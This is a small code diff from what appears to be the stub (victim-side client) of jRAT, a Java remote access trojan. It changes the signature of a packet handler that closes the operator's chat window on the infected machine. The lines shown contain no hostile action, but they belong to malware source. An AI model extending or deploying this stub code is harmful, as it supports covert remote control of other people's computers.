@@ -5,7 +5,7 @@ import se.jrat.stub.Connection;
 public class Packet49ChatEnd extends AbstractIncomingPacket {
 
 	@Override
-	public void read() throws Exception {
+	public void read(Connection con) throws Exception {
 		Connection.instance.getFrameChat().setVisible(false);
 		Connection.instance.getFrameChat().dispose();
 		Connection.instance.setFrameChat(null);
